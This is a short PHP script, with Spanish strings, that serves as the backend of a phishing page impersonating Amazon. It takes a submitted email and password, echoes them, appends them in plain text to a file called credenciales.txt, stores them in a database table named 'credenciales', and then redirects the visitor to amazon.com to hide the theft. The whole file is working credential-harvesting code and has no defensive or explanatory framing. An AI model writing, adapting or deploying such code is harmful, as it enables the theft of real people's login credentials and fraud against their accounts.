<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

include 'conexion.php';

$username = $_POST['email'];
$password = $_POST['password'];

echo('Datos recibidos: ' . $username . ' ' . $password);

file_put_contents('credenciales.txt', "Usuario: $username, Contraseña: $password\n", FILE_APPEND);

$stmt = $conn->prepare("INSERT INTO credenciales (correo, password) VALUES (?, ?)");
$stmt->bind_param("ss", $username, $password);

if ($stmt->execute()) {
    echo "Datos guardados correctamente.";
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();

echo "Redireccionando a Amazon...";

header('Location: https://www.amazon.com/');
exit;
?>
